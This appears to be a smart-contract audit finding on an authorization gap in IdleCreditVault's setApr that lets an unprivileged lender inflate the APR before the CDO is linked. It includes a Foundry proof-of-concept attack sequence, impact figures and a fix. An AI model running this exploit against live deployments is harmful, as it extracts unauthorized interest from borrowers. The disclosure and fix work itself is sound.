### Title
Unauthenticated APR overwrite before CDO linking inflates lender payouts - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` skips its caller check while `idleCDO == address(0)`, so an unprivileged account can overwrite `lastApr`; the wrappers `setAprs` and `setAprsWithBuffer` also overwrite `unscaledApr` in the same transaction. If a manually deployed strategy is initialized before it is linked to its CDO, an attacker can set the maximum permitted APR, join as a KYC-passing tranche holder, and force the honest borrower to fund up to 20% annualized interest through the normal epoch-accounting path. [1](#0-0) 

### Finding Description
The intended invariant is that only the linked CDO or strategy manager can update the vault APR. Once `idleCDO` is configured, `setApr` enforces `msg.sender == idleCDO || msg.sender == manager`, and `maxApr` bounds the scaled APR. [2](#0-1) 

That authorization is disabled whenever `idleCDO` is zero. The code explicitly treats this as a setup convenience rather than authenticating the owner or manager:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
```

`initialize` leaves `idleCDO` unset and installs `DEFAULT_MAX_APR = 20e18`. [3](#0-2)  A subsequent owner transaction calls `setWhitelistedCDO`, but there is no atomicity requirement between initialization and linking. [4](#0-3) 

During `startEpoch`, the CDO prices the borrower's obligation from the strategy's currently stored `lastApr` through `_calcInterest(getContractValue())`; it does not rederive APR from owner-approved parameters. [5](#0-4)  At `stopEpoch`, the CDO pulls that expected interest plus pending withdrawal funding from the borrower. [6](#0-5) 

The factory path avoids the exposed gap because deployment, APR configuration, and `setWhitelistedCDO` occur atomically in one transaction. [7](#0-6)  The vulnerable path is therefore a manually initialized strategy where the owner links the CDO in a later transaction.

### Impact Explanation
An attacker who is a permitted lender can set `lastApr` to the default maximum `20e18` before the CDO is linked, then deposit into AA or BB tranches and receive the resulting inflated share of epoch interest. For example, a 1,000,000-token pool and a 30-day epoch produce roughly `1,000,000 * 20% * 30 / 365 ≈ 16,438` tokens of unauthorized borrower-paid interest, before fees and tranche splitting. [8](#0-7) 

This is direct mispricing of the borrower obligation and unfair mint/accrual of lender yield. It is not merely a configuration inconvenience: the resulting `expectedEpochInterest` is pulled from the honest borrower and distributed through tranche accounting. [9](#0-8) 

### Likelihood Explanation
Likelihood is deployment-flow dependent. Factory deployments are atomic and therefore not exploitable through this gap, but manual deployment must currently keep `idleCDO == 0` until `setWhitelistedCDO` is called. Any observer can overwrite APR in that window; the attacker does not need a privileged role, malformed oracle input, or borrower collusion.

The default cap limits the forged APR to 20% scaled APR unless the honest owner later disables the cap. KYC does not prevent the attack because a whitelisted lender is explicitly in scope and only needs to deposit after poisoning the APR.

### Recommendation
Require authorization unconditionally in `setApr`, while still allowing the factory or owner to configure the strategy before linking:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol
function setApr(uint256 _apr) public {
  if (msg.sender != idleCDO && msg.sender != manager && msg.sender != owner()) {
    revert NotAllowed();
  }
  uint256 _maxApr = maxApr;
  if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
  lastApr = _apr;
}
```

Preferably also validate the caller before mutating `unscaledApr` in `setAprs` and `setAprsWithBuffer`. If pre-link configuration must remain available to a deployer other than owner or manager, store an explicit immutable/initialized `configurator` role rather than disabling authentication entirely.

### Proof of Concept
Foundry fork sequence for a manually initialized strategy:

```solidity
// test/foundry/IdleCreditVaultUnauthApr.t.sol
function testUnauthAprBeforeCdoLink() external {
  // Honest owner initializes the strategy. idleCDO remains address(0).
  strategy.initialize(underlying, owner, manager, borrower, "Borrower", intendedApr);

  // Unprivileged lender front-runs/sequences before owner calls setWhitelistedCDO.
  vm.prank(attacker);
  strategy.setAprs(20e18, 20e18); // DEFAULT_MAX_APR permits this value.

  // Honest owner completes linking and configuration.
  vm.prank(owner);
  strategy.setWhitelistedCDO(address(cdo));

  // Attacker is KYC-passing and deposits through the normal CDO path.
  vm.startPrank(attacker);
  underlying.approve(address(cdo), depositAmount);
  cdo.depositAA(depositAmount);
  vm.stopPrank();

  // Honest manager starts the epoch. The poisoned lastApr determines expected interest.
  vm.prank(manager);
  cdo.startEpoch();

  uint256 expected = strategy.getApr();
  assertEq(expected, 20e18);

  uint256 inflatedInterest =
    cdo.getContractValue() * (expected / 100) * cdo.epochDuration() /
      (365 days * 1e18);

  assertGt(inflatedInterest, intendedInterest);

  // Honest borrower approves and stopEpoch pulls the inflated amount.
  vm.prank(borrower);
  underlying.approve(address(cdo), type(uint256).max);
  vm.warp(cdo.epochEndDate() + 1);
  vm.prank(manager);
  cdo.stopEpoch(nextApr, 0);

  assertGt(attackerProceeds, honestProceeds);
}
```

The key assertion is that `strategy.setAprs(20e18, 20e18)` succeeds from `attacker` only because `idleCDO` is still zero, and `startEpoch` subsequently consumes the poisoned value without authenticating how it was set.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L124-147)
```text
  function initialize(
    address _underlyingToken,
    address _owner,
    address _manager,
    address _borrower,
    string memory borrowerName,
    uint256 _apr
  ) public virtual initializer {
    OwnableUpgradeable.__Ownable_init();
    ReentrancyGuardUpgradeable.__ReentrancyGuard_init();
    require(token == address(0), "Token is already initialized");

    //----- // -------//
    token = _underlyingToken;
    underlyingToken = IERC20Detailed(token);
    tokenDecimals = underlyingToken.decimals();
    oneToken = 10**(tokenDecimals);
    borrower = _borrower;
    manager = _manager;
    maxApr = DEFAULT_MAX_APR;
    // on the first setup we set the lastApr equal to the unscaledApr
    lastApr = _apr;
    unscaledApr = _apr;
    defaultRecoveryInitialized = true;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L217-235)
```text
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L953-957)
```text
  /// @notice allow to update whitelisted address
  function setWhitelistedCDO(address _cdo) external onlyOwner {
    require(_cdo != address(0), "IS_0");
    idleCDO = _cdo;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L252-263)
```text
    IdleCreditVault _strategy = IdleCreditVault(strategy);

    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;
```

**File:** contracts/IdleCDOEpochVariant.sol (L359-389)
```text
    // Base interest for stopEpoch: explicit override (>1) or precomputed expected epoch interest.
    uint256 _expectedInterest;
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();

    // special case where we get everything back from the borrower
    if (_isRequestingAllFunds) {
      // Recall gross strategy-token principal, including fee backing excluded from net CDO NAV.
      // Prefunded variants also add queue deposits already sent directly to the borrower.
      _totBorrowed += _contractTokenBalance(strategyToken);
      _expectedInterest += _totBorrowed;
    }
    uint256 _grossInterest = _isRequestingAllFunds ? _expectedInterest - _totBorrowed : _expectedInterest;
    bool _mintInterest = isInterestMinted && !_isRequestingAllFunds;
    // In minted mode IdleCDO only needs cash for withdraw requests, not for epoch interest itself.
    uint256 _amountToPullFromBorrower = _mintInterest ? 0 : _expectedInterest;
    if (_mintInterest && _interest > 1) {
      uint256 _maxApr = _strategy.maxApr();
      _checkNotAllowed(_maxApr != 0 && _grossInterest > _calcInterestWithApr(getContractValue(), _maxApr) + _pendingWithdrawFees);
    }

    // Checkpoint management fees before borrower funds are pulled in so the elapsed-period
    // accrual applies only to the pre-stop live NAV, not to newly received epoch interest.
    _accrueManagementFee();

    // Persist only resolved epoch interest for recovery accounting. In close-pool mode `_interest == 1`
    // is a sentinel: `_grossInterest` excludes the principal added to `_expectedInterest` above.
    expectedEpochInterest = _grossInterest;
    pendingWithdrawFees = _pendingWithdrawFees;
```

**File:** contracts/IdleCDOEpochVariant.sol (L406-419)
```text
    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
      // NOTE: Fees are sent with 2 different transfer calls, here and after updateAccounting, to avoid complicated calculations
      if (!_mintInterest) {
        _transferFeeUnderlyings(_pendingWithdrawFees);
```

**File:** contracts/IdleCDOEpochVariant.sol (L800-809)
```text
  function _calcInterest(uint256 _amount) internal view returns (uint256) {
    return _calcInterestWithApr(_amount, _getStrategyApr());
  }

  /// @notice Calculate the interest of an epoch for the given amount and apr
  /// @param _amount Amount of underlyings
  /// @param _apr Apr used for the calculation
  function _calcInterestWithApr(uint256 _amount, uint256 _apr) internal view returns (uint256) {
    return _amount * (_apr / 100) * epochDuration / (365 days * ONE_TRANCHE_TOKEN);
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L288-307)
```text
  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
```
